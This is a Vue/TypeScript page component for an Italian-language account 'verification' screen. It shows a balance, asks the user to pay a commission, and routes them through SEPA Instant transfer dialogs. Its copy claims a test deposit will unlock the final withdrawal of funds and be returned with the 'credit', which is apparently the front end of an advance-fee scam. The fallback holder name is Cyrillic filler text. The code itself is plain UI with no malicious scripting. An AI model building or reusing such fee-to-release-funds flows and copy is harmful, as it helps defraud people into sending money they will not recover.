<script setup lang="ts">
import { computed, ref } from 'vue';
import { useRoute, useRouter } from 'vue-router';
import { ProfileHeader } from '@/widgets/header';
import { ProfileBalance } from '@/widgets/balance';
import { VerificationStatus } from '@/widgets/verification';
import { CommissionDialog } from '@/features/pay-commission';
import { usePaymentStore } from '@/entities/payment';
import { ProfileDialog, ProfileButton } from '@/shared/ui';
const route = useRoute();
const router = useRouter();
const payment = usePaymentStore();
const personalCoordinates = ref(false);
const commission = computed(() => route.query.state === 'commission');
const checking = computed(() => route.query.state === 'checking');
const details = computed(() => route.query.overlay === 'details');
const sepa = computed(() => route.query.overlay === 'sepa');
const coordinates = computed(() => route.query.overlay === 'coordinates' || sepa.value);
const holder = computed(() => payment.holder || 'куа ку');
const iban = computed(() => payment.iban || 'IT00 •••• •••• •••• •••• •••9 872');
function showCoordinates() {
  personalCoordinates.value = true;
}
function closeCoordinates() {
  personalCoordinates.value = false;
}
function closeCommission() {
  void router.push({ name: 'verification' });
}
function back() {
  if (route.query.overlay)
    void router.push({ name: 'verification', query: { state: 'commission' } });
  else closeCommission();
}
function next() {
  void router.push({
    name: 'verification',
    query: { state: 'commission', overlay: 'coordinates' },
  });
}
function showDetails() {
  void router.push({ name: 'verification', query: { state: 'commission', overlay: 'details' } });
}
function showSepa() {
  void router.push({ name: 'verification', query: { state: 'commission', overlay: 'sepa' } });
}
</script>
<template>
  <ProfileHeader dashboard />
  <main :class="$style.layout">
    <ProfileBalance ready />
    <VerificationStatus
      :checking="checking"
      :holder="holder"
      :iban="iban"
      :amount="payment.amount"
      @coordinates="showCoordinates"
    />
  </main>
  <CommissionDialog
    v-if="commission"
    verification
    :coordinates="coordinates"
    @close="closeCommission"
    @back="back"
    @next="next"
    @details="showDetails"
    @sepa="showSepa"
  />
  <ProfileDialog v-if="details" title="Dettagli" :dialog-class="$style.details" @close="back">
    <div :class="$style.copy">
      <p>
        Per completare la verifica del conto è necessario effettuare un deposito di prova di 0 € che
        sarà restituito dopo la verifica.
      </p>
      <p>La procedura conferma la titolarità del conto e sblocca il prelievo finale dei fondi.</p>
      <aside>
        Dopo la verifica l’importo del deposito di prova sarà disponibile insieme all’importo del
        credito.
      </aside>
      <ProfileButton variant="primary" @click="back">Ho capito</ProfileButton>
    </div>
  </ProfileDialog>
  <ProfileDialog v-if="sepa" title="SEPA Instant" @close="next">
    <div :class="$style.copy">
      <p>SEPA Instant garantisce l'elaborazione del pagamento entro 60 minuti.</p>
      <p>
        Con bonifico ordinario (SEPA Standard) l'accredito del credito può richiedere da 1 a 3
        giorni lavorativi.
      </p>
      <ProfileButton @click="next">Ho capito</ProfileButton>
    </div>
  </ProfileDialog>
  <ProfileDialog v-if="personalCoordinates" title="Le mie coordinate" @close="closeCoordinates">
    <dl :class="$style.copy">
      <dt>Intestatario</dt>
      <dd>{{ holder }}</dd>
      <dt>IBAN</dt>
      <dd>{{ iban }}</dd>
    </dl>
  </ProfileDialog>
</template>
<style module lang="scss" src="./styles/verification/index.module.scss"></style>
